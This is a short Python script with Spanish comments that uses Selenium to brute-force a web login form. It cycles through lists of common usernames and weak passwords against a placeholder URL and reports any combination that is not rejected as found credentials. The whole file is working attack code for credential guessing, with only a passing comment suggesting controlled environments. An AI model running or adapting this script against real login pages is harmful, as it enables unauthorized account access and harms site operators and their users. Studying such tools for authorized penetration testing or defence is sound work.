from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Configuración de Selenium (Chrome)
driver = webdriver.Chrome()

# URL de prueba (usa entornos controlados)
url = "https://example.com/login"

# Lista de credenciales
usuarios = ["admin", "user1", "test"]
passwords = ["123456", "password", "admin123"]

# Iterar sobre combinaciones de usuario y contraseña
for usuario in usuarios:
    for password in passwords:
        driver.get(url)  # Abrir la URL

        try:
            # Buscar los campos de usuario y contraseña
            campo_usuario = driver.find_element(By.NAME, "username")
            campo_password = driver.find_element(By.NAME, "password")

            # Limpiar campos (IMPORTANTE)
            campo_usuario.clear()
            campo_password.clear()

            # Ingresar datos
            campo_usuario.send_keys(usuario)
            campo_password.send_keys(password)
            campo_password.send_keys(Keys.RETURN)

            time.sleep(2)  # Esperar respuesta

            # Verificar resultado (esto depende del sitio)
            if "incorrect" not in driver.page_source:
                print(f"[+] Credenciales encontradas: {usuario}:{password}")
                driver.quit()
                exit()
            else:
                print(f"[-] Intento fallido: {usuario}:{password}")

        except Exception as e:
            print(f"[!] Error durante el intento: {e}")

# Cerrar navegador al final
driver.quit()
